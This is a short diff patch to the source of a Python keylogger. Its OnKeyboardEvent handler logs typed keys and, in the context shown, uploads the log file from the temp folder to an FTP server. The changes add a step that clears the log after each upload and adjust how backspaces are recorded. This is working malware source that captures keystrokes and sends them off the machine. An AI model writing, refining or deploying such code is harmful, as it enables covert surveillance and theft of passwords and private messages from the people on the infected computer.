@@ -136,7 +136,7 @@ def OnKeyboardEvent(event):
             else:
                 objLogFile = open(TMP + "/log.txt", 'rb'); ftp.storbinary("STOR log.txt", objLogFile)
             objLogFile.close(); ftp.close()
-            # send log file
+            objLogFile = open(TMP + "/log.txt", 'w'); objLogFile.close()  # delete log file contents
         except:
             os._exit(1)
 
@@ -220,7 +220,8 @@ def OnKeyboardEvent(event):
     if event.Ascii == 8:
         if blnBackRemove == "True":
             if not strLogs == "":
-                strLogs = strLogs[0:len(strLogs) - 1]
+                if intLogChars > 0:
+                    strLogs = strLogs[0:len(strLogs) - 1]
         else:
             strLogs = strLogs + " [BckSpace] "
     elif event.Ascii == 9:
